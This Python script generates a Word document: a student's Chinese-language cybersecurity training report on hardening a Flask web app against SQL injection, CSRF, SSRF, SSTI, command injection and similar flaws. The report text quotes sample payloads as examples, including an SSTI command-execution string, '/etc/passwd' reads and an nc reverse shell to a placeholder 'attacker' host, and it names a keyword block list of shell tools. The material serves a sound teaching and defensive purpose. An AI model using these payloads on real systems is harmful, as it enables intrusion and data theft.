#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""生成实习报告 Word 文档"""

from docx import Document
from docx.shared import Pt, Inches, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
import datetime, os

doc = Document()

# ====================== 样式 ======================
style = doc.styles['Normal']
font = style.font
font.name = '微软雅黑'
font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), '微软雅黑')

for level in range(1, 4):
    hs = doc.styles[f'Heading {level}']
    hs.font.name = '微软雅黑'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), '微软雅黑')

# ====================== 封面 ======================
for _ in range(5):
    doc.add_paragraph('')

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = p.add_run('网络安全实训报告')
run.font.size = Pt(28)
run.font.bold = True
run.font.color.rgb = RGBColor(0x1A, 0x1A, 0x2E)

doc.add_paragraph()

p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = p.add_run('从漏洞分析到安全加固的完整实践')
run.font.size = Pt(14)
run.font.color.rgb = RGBColor(0x66, 0x66, 0x66)

for _ in range(4):
    doc.add_paragraph('')

info_table = doc.add_table(rows=6, cols=2)
info_table.alignment = WD_TABLE_ALIGNMENT.CENTER
info_data = [
    ('姓名', '王宇杨'),
    ('实训周期', '2026年7月19日 — 2026年7月27日'),
    ('实训环境', 'Kali Linux + OpenClaw + Burp Suite + Chrome'),
    ('实训项目', '用户管理系统（Flask Web 应用）'),
    ('远程仓库', 'https://github.com/1343313511/shixun'),
    ('报告日期', datetime.datetime.now().strftime('%Y年%m月%d日')),
]
for i, (k, v) in enumerate(info_data):
    ck = info_table.rows[i].cells[0]
    cv = info_table.rows[i].cells[1]
    ck.text = k; cv.text = v
    for cell in [ck, cv]:
        for paragraph in cell.paragraphs:
            paragraph.alignment = WD_ALIGN_PARAGRAPH.CENTER
            for run in paragraph.runs:
                run.font.size = Pt(12)

doc.add_page_break()

# ====================== 目录 ======================
doc.add_heading('目录', level=1)
toc = [
    '一、实训概述',
    '二、实训环境与工具',
    '三、实训内容与成果',
    '    3.1 环境搭建与基础配置',
    '    3.2 密码安全与暴力破解防御',
    '    3.3 SQL 注入漏洞修复',
    '    3.4 越权漏洞修复',
    '    3.5 CSRF 漏洞修复',
    '    3.6 文件上传漏洞修复',
    '    3.7 文件包含与 XSS 漏洞修复',
    '    3.8 SSRF 漏洞修复',
    '    3.9 SSTI 模板注入漏洞修复',
    '    3.10 命令注入漏洞修复',
    '    3.11 Shell 反弹与 Linux 利用手法',
    '四、项目综合安全架构',
    '五、实训总结与收获',
]
for item in toc:
    p = doc.add_paragraph(item)
    p.paragraph_format.space_before = Pt(1)
    p.paragraph_format.space_after = Pt(1)

doc.add_page_break()

# ====================== 一、实训概述 ======================
doc.add_heading('一、实训概述', level=1)

doc.add_paragraph(
    '本次网络安全实训以 Kali Linux 为操作平台，以一个完整的 Flask Web 用户管理系统为靶标，'
    '从攻防两个视角系统性地开展了安全实训。实训覆盖了 OWASP Top 10 中多个核心漏洞类型，'
    '包括 SQL 注入、越权访问、CSRF、文件上传绕过、文件包含、XSS、SSRF、SSTI 模板注入、'
    '命令注入等，同时还涉及密码安全、暴力破解防御、Shell 反弹、Linux 提权、隧道代理等'
    '渗透测试技术。通过"发现问题 → 分析原理 → 验证利用 → 安全修复"的完整闭环，'
    '达到了理解漏洞本质、掌握修复方法、建立安全编码思维的目标。'
)

# ====================== 二、实训环境与工具 ======================
doc.add_heading('二、实训环境与工具', level=1)

env_table = doc.add_table(rows=8, cols=3)
env_table.style = 'Light Grid Accent 1'
headers = ['类别', '工具 / 平台', '用途']
for i, h in enumerate(headers):
    env_table.rows[0].cells[i].text = h
env_data = [
    ('操作系统', 'Kali Linux 2026', '渗透测试平台'),
    ('AI / 自动化', 'OpenClaw AI Agent', '漏洞扫描、修复辅助、报告生成'),
    ('Web 应用', 'Flask（Python）', '实训靶标项目开发框架'),
    ('代理抓包', 'Burp Suite Professional', 'HTTP 请求拦截、重放、字典攻击'),
    ('数据库', 'SQLite', '项目数据存储'),
    ('版本控制', 'Git + GitHub', '代码管理与报告存档'),
    ('浏览器', 'Chrome / Chromium', '前端调试与验证'),
]
for r, (cat, tool, usage) in enumerate(env_data):
    env_table.rows[r+1].cells[0].text = cat
    env_table.rows[r+1].cells[1].text = tool
    env_table.rows[r+1].cells[2].text = usage

doc.add_paragraph()

doc.add_heading('实训项目简介', level=2)
doc.add_paragraph(
    '实训项目名称为"用户管理系统"（Class01），是一个基于 Flask 框架开发的 Web 应用，'
    '功能涵盖用户注册登录、个人资料管理、头像上传、URL 抓取、搜索、页面管理、Ping 网络诊断等。'
    '项目源码托管于 GitHub 仓库 https://github.com/1343313511/shixun，'
    '前后共经过 20 次 Git 提交，完成了从初始版本到全面安全加固的演进。'
)

# ====================== 三、实训内容与成果 ======================
doc.add_page_break()
doc.add_heading('三、实训内容与成果', level=1)

# 3.1
doc.add_heading('3.1 环境搭建与基础配置（Day 1）', level=2)
doc.add_paragraph(
    '实训首日完成了 Kali Linux 操作系统的初始化配置，包括系统更新、网络配置、'
    '基础工具链安装。随后完成了 OpenClaw AI 系统的安装部署，并将其对接 QQ Bot 通道，'
    '实现了通过 QQ 与 AI Agent 交互的能力，为后续自动化漏洞分析和报告生成奠定了基础。'
    '最后，将实训项目 Fork 到本地并推送至个人 GitHub 仓库，建立了版本管理规范。'
)

# 3.2
doc.add_heading('3.2 密码安全与暴力破解防御（Day 1-2）', level=2)
doc.add_paragraph(
    '密码安全是 Web 安全的第一道防线。实训内容涵盖四个方面：'
)
pw_items = [
    '常见系统默认密码：梳理了路由器、数据库、中间件等常见系统的默认账号密码，建立了安全意识基线',
    '用户名密码泄露：分析了密码泄露的常见途径（数据库注入、日志泄漏、社工库），学习了密码保护策略',
    'Burp Suite 配置与使用：配置了 Burp Suite 代理，掌握请求拦截、修改、重放等核心功能',
    '字典攻击实战：使用 Burp Suite Intruder 模块搭配字典对登录接口进行暴力破解攻击',
]
for item in pw_items:
    doc.add_paragraph(item, style='List Bullet')

doc.add_paragraph(
    '防护修复：针对暴力破解风险，在项目中实现了指数退避延迟算法（连续失败后等待时间指数增长）、'
    '图形验证码验证、账号锁定机制（5 次失败后锁定 15 分钟）、密码哈希存储（Werkzeug generate_password_hash）'
    '以及登录时间线攻击防护（固定比较时间，不提前返回）。'
)

# 3.3
doc.add_heading('3.3 SQL 注入漏洞修复（Day 2）', level=2)
doc.add_paragraph(
    '实训项目初始版本的所有数据库操作均使用 f-string 拼接 SQL 语句，存在严重的 SQL 注入漏洞。'
    '例如，登录接口直接拼接用户名和密码到 SQL 查询中，攻击者可以输入 admin\' OR \'1\'=\'1 绕过认证，'
    '或在搜索接口中使用 UNION SELECT 读取任意表数据。'
)
doc.add_paragraph(
    '修复方案：将所有 SQL 操作统一改为参数化查询（cursor.execute(sql, (param1, param2, ...))），'
    '利用数据库驱动内置的转义机制彻底杜绝 SQL 注入。同时明文密码改为哈希存储，用户输入长度做了上限限制。'
)

# 3.4
doc.add_heading('3.4 越权漏洞修复（Day 2）', level=2)
doc.add_paragraph(
    '初始项目存在垂直越权漏洞：未登录用户可以直接访问 /profile、/upload 等需要认证的页面。'
    '修复方案：新增 login_required 装饰器，在需要登录的路由上添加 @login_required() 装饰，'
    '未登录时自动重定向到登录页面。同时增加水平越权防护，在个人中心页面校验当前用户只能访问自己的数据。'
)

# 3.5
doc.add_heading('3.5 CSRF 漏洞修复（Day 3）', level=2)
doc.add_paragraph(
    'CSRF（跨站请求伪造）漏洞存在于所有需要认证的 POST 操作中。攻击者可以构造恶意页面，'
    '诱导已登录用户触发请求，从而以用户身份执行非预期操作。'
    '修复方案：使用 Flask-WTF 提供的 CSRFProtect 中间件，在全局启用 CSRF 令牌验证；'
    '在模板中的表单里添加 {{ form.csrf_token }} 或 <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">，'
    '确保每个 POST 请求都附带唯一令牌。'
)

# 3.6
doc.add_heading('3.6 文件上传漏洞修复（Day 2）', level=2)
doc.add_paragraph(
    '文件上传功能存在两个严重漏洞：\n'
    '1）路径穿越：上传文件名未做安全检查，攻击者可以使用 ../../etc/shell.php 路径穿越到系统目录\n'
    '2）类型绕过：仅检查 Content-Type 头判断文件类型，攻击者可以修改 Content-Type 上传任意恶意文件\n'
    '修复方案：使用 werkzeug.secure_filename() 处理上传文件名，移除所有路径分隔符；'
    '新增文件魔数（Magic Number）校验，在服务端读取文件头字节验证真实文件类型（图片文件的前几个字节有固定特征），'
    '防止通过修改 Content-Type 绕过检测。限制上传文件大小为 2MB。'
)

# 3.7
doc.add_heading('3.7 文件包含与 XSS 漏洞修复（Day 4）', level=2)
doc.add_paragraph(
    '/page 路由存在本地文件包含漏洞：从 pages/ 目录读取文件时未做充分的路径校验，'
    '攻击者可以使用 ../ 读取系统文件。XSS 漏洞存在于用户昵称、搜索框、反馈等多个输入点，'
    '用户输入直接渲染到页面上未做转义。'
    '修复方案：对文件包含使用 os.path.normpath + os.path.realpath 双重解析，'
    '并校验路径是否严格在 pages_dir 前缀下。XSS 修复使用 html.escape() 对所有用户输入进行'
    'HTML 实体转义后渲染到模板中。'
)

# 3.8
doc.add_heading('3.8 SSRF 漏洞修复（Day 5）', level=2)
doc.add_paragraph(
    '/fetch-url 路由存在服务端请求伪造漏洞：用户提交 URL 后服务端直接使用 urllib 发起请求，'
    '未做任何过滤，攻击者可以访问内网服务（如 127.0.0.1:5000、内网 Redis、数据库等）。'
    '修复方案：URL 白名单校验，只允许 http/https 协议；内网地址黑名单过滤'
    '（127.0.0.1、10.x.x.x、172.16-31.x.x、192.168.x.x）；自定义 DNS 解析，'
    '在请求前先用 socket.getaddrinfo 解析域名，如果结果指向内网则拒绝请求；'
    '设置 socket.setdefaulttimeout 超时控制。'
)

# 3.9
doc.add_heading('3.9 SSTI 模板注入漏洞修复（Day 6）', level=2)
doc.add_paragraph(
    '/welcome 和 /feedback 路由使用 render_template_string() 并且直接将用户输入拼接到模板字符串中，'
    '攻击者可以注入 {{config}} 泄露 Flask 密钥，或通过 {{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
    '执行任意系统命令，造成远程代码执行（RCE）。使用自动化扫描工具验证了完整的攻击链，'
    '从基础注入探测 {{7*7}} 到读取 /etc/passwd 均可成功。'
    '修复方案：新增 safe_str() 函数对所有用户输入执行 html.escape() 转义后再拼接模板字符串，'
    '将 {{}} 等模板语法标记转义为 HTML 实体，使 Jinja2 引擎无法解析。同时建议优先使用 render_template 而非 render_template_string。'
)

# 3.10
doc.add_heading('3.10 命令注入漏洞修复（Day 7）', level=2)
doc.add_paragraph(
    '新增加的 /ping 路由使用 f"ping -c 3 {ip}" 字符串拼接命令并设置 shell=True，'
    '将用户输入直接传递给 /bin/sh 解析执行。攻击者可以输入 8.8.8.8;id 同时执行 ping 和 id 命令，'
    '或者 8.8.8.8|cat /etc/passwd 读取系统文件，甚至 8.8.8.8|nc attacker 4444 -e /bin/sh 反弹 Shell。'
)
doc.add_paragraph(
    '修复方案采用三层防御策略：\n'
    '第一层：白名单字符校验 — 正则 ^[a-zA-Z0-9.\\-]+$ 仅允许合法字符，拒绝所有 shell 元字符\n'
    '第二层：危险关键词拦截 — 检测 rm、mkfs、bash、wget、curl、nc 等命令关键词\n'
    '第三层：参数列表执行 — 改为 ["ping", "-c", "3", ip] 参数列表形式，彻底禁用 shell=True\n'
    '此外，对看起来是 IP 的输入使用 ipaddress.IPv4Address 做严格格式校验。'
)

# 3.11
doc.add_heading('3.11 Shell 反弹与 Linux 利用手法（穿插实训）', level=2)
doc.add_paragraph(
    '实训期间穿插学习了以下渗透测试进阶技术：'
)
adv_items = [
    'Shell 反弹手法：掌握了 bash / nc / Python / PHP 等多种反向 Shell 的构造方式，'
    '理解了正向连接与反向连接的应用场景及防火墙穿透原理',
    'PHP 反弹 Shell 木马使用：编写了 PHP 一句话木马结合反向 Shell 实现 WebShell 管理，'
    '理解了文件上传漏洞与命令执行的组合利用',
    'Linux 常见利用手法：学习了 SUID 提权、计划任务利用、sudo 配置错误、'
    '内核漏洞提权、docker 逃逸等 Linux 系统层面的攻击手法',
    'NPS 客户端配置：学习了使用 NPS（内网穿透工具）配置客户端隧道，'
    '实现了从外网访问内网 Web 服务的能力',
    'FRP 内网穿透（CVE-2026-40910）：分析了 frp 最新的 TOP 7 漏洞，'
    '理解了代理隧道在内网渗透中的关键作用',
    'WAF 绕过 Fuzz 测试：针对 SQLi-LABS 靶场开展了 WAF 绕过模糊测试，'
    '掌握了注释符绕过、大小写混淆、双写绕过、编码绕过等技巧',
]
for item in adv_items:
    doc.add_paragraph(item, style='List Bullet')

# ====================== 四、项目综合安全架构 ======================
doc.add_page_break()
doc.add_heading('四、项目综合安全架构', level=1)

doc.add_paragraph(
    '经过为期九天的系统性安全加固，用户管理系统的整体安全架构发生了质的飞跃。'
    '以下从攻击面覆盖和防御纵深两个维度进行总结。'
)

doc.add_heading('4.1 修复漏洞总览', level=2)
sum_table = doc.add_table(rows=10, cols=4)
sum_table.style = 'Light Grid Accent 1'
sum_table.rows[0].cells[0].text = '序号'
sum_table.rows[0].cells[1].text = '漏洞类型'
sum_table.rows[0].cells[2].text = '风险等级'
sum_table.rows[0].cells[3].text = '关键修复措施'

sum_data = [
    ('1', 'SQL 注入', '🔴 严重', '参数化查询，哈希存储'),
    ('2', '垂直/水平越权', '🔴 严重', 'login_required 装饰器 + 用户校验'),
    ('3', 'CSRF', '🔴 严重', 'CSRFProtect 中间件 + 令牌验证'),
    ('4', '文件上传绕过', '🔴 严重', '魔数校验 + secure_filename'),
    ('5', '文件包含/XSS', '🟠 高危', '路径规范化 + html.escape 转义'),
    ('6', 'SSRF', '🔴 严重', 'DNS 解析 + 内网黑名单 + 白名单协议'),
    ('7', 'SSTI 模板注入', '🔴 严重', 'html.escape 转义模板变量'),
    ('8', '命令注入', '🔴 严重', '参数列表 + 字符白名单校验'),
    ('9', '暴力破解/密码泄露', '🟠 高危', '指数退避 + 验证码 + 账号锁定 + 哈希'),
]
for r, (no, vtype, risk, fix) in enumerate(sum_data):
    sum_table.rows[r+1].cells[0].text = no
    sum_table.rows[r+1].cells[1].text = vtype
    sum_table.rows[r+1].cells[2].text = risk
    sum_table.rows[r+1].cells[3].text = fix

doc.add_paragraph()

doc.add_heading('4.2 防御纵深体系', level=2)
doc.add_paragraph(
    '实训项目最终形成的安全架构体现了纵深防御（Defense in Depth）的设计理念：'
)
layers = [
    '第一层 — 输入验证层：所有用户输入经过白名单校验 / 长度限制 / 格式校验，拒绝非法输入',
    '第二层 — 参数化处理层：数据库操作使用参数化查询，系统命令使用参数列表，模板变量使用转义函数',
    '第三层 — 认证授权层：登录认证 + CSRF 令牌 + 权限校验，确保请求合法且用户有权操作',
    '第四层 — 输出编码层：所有用户数据输出经过 HTML 转义，防止 XSS 和模板注入',
    '第五层 — 资源限制层：文件大小限制、请求超时控制、登录尝试次数限制',
    '第六层 — 审计日志层：关键操作记录日志，便于事后追溯',
]
for layer in layers:
    doc.add_paragraph(layer, style='List Bullet')

doc.add_heading('4.3 安全开发规范沉淀', level=2)
doc.add_paragraph(
    '实训过程中沉淀了以下安全开发规范：'
)
rules = [
    '所有用户输入不可信，严格校验后再处理',
    '禁止使用字符串拼接 SQL（必须用参数化查询）',
    '禁止使用 shell=True + 字符串拼接执行系统命令（必须用参数列表）',
    '优先使用 render_template 传递变量，避免 render_template_string',
    '所有输出到 HTML 的内容必须经过 html.escape 转义',
    '文件上传使用魔数校验而非仅依赖 Content-Type',
    'CSRF 保护是 POST 请求的标配，不可省略',
    '认证授权必须在服务端完成，前端控制仅为辅助',
]
for r in rules:
    doc.add_paragraph(r, style='List Bullet')

# ====================== 五、实训总结与收获 ======================
doc.add_page_break()
doc.add_heading('五、实训总结与收获', level=1)

doc.add_heading('5.1 知识体系构建', level=2)
doc.add_paragraph(
    '通过本次实训，我系统性地构建了 Web 安全的知识体系。从最初只知道"SQL 注入"这个名词，'
    '到能够独立分析漏洞原理、编写攻击载荷、完成修复方案并编写专业漏洞报告，'
    '全过程覆盖了 OWASP Top 10 中的绝大部分核心漏洞类型。更重要的是，学会了从"攻击者视角"'
    '和"防御者视角"双向思考问题——在分析每个漏洞时，先理解攻击者如何利用，再设计防御策略。'
)

doc.add_heading('5.2 工具使用能力', level=2)
doc.add_paragraph(
    '熟练掌握了安全从业人员必备的工具链：Kali Linux 作为底层操作系统环境；'
    'Burp Suite 进行 HTTP 流量分析、拦截修改和字典攻击；OpenClaw AI Agent 辅助漏洞分析、'
    '代码修复和报告自动化生成；Git 进行版本管理和协同开发。这些工具在未来的安全工作中将发挥重要作用。'
)

doc.add_heading('5.3 AI 辅助安全实践', level=2)
doc.add_paragraph(
    '本次实训的一大特色是将 AI Agent（OpenClaw）深度集成到安全工作流中。'
    'AI 不仅辅助完成了漏洞分析、修复代码编写和报告文档生成，还能够通过自动化工具有条理地'
    '管理项目文件、执行 Git 操作、访问外部资源。这让我深刻感受到 AI 在安全领域的应用前景——'
    'AI 不会替代安全工程师，但能大幅提升安全工作的效率和质量，让工程师更专注于高层次的策略设计和分析决策。'
)

doc.add_heading('5.4 安全思维转变', level=2)
doc.add_paragraph(
    '实训最大的收获不是具体的漏洞修复技术，而是安全思维的建立。'
    '一个 Web 应用的安全性不是某个"安全功能"决定的，而是由每一个输入点、每一个输出点、'
    '每一条数据库查询、每一次系统调用共同决定的。安全不是"加一个防火墙"或"装一个 WAF"就能解决的，'
    '它需要渗透到开发的全生命周期——从需求分析、架构设计、编码实现到测试部署的每个环节。'
)
doc.add_paragraph(
    '这次实训的九个修复版本（SQL 注入 → 越权 → CSRF → 文件上传 → 文件包含/XSS → SSRF → SSTI → 命令注入）'
    '恰好展示了安全是一个持续的、迭代的过程，而不是一劳永逸的任务。'
    '这种"持续安全"的理念将贯穿我未来的技术生涯。'
)

doc.add_heading('5.5 未来方向', level=2)
doc.add_paragraph(
    '本次实训覆盖了 Web 应用安全的主要方面，但安全领域的知识边界远不止于此。'
    '未来可以继续深入的方向包括：'
)
future = [
    '容器与云安全：Docker/K8s 安全配置、镜像漏洞扫描、容器逃逸防护',
    '移动安全：Android/iOS 应用逆向、应用加固、隐私合规检测',
    '安全开发实践：DevSecOps 流水线集成、SAST/DAST 工具链搭建、安全需求评审',
    '红蓝对抗：参与 CTF 比赛、搭建攻防靶场、演练应急响应流程',
]
for f in future:
    doc.add_paragraph(f, style='List Bullet')

# ====================== 保存 ======================
output_path = '/opt/Class01/项目/网络安全实训报告-王宇杨.docx'
doc.save(output_path)
print(f'✅ 实习报告已生成: {output_path}')
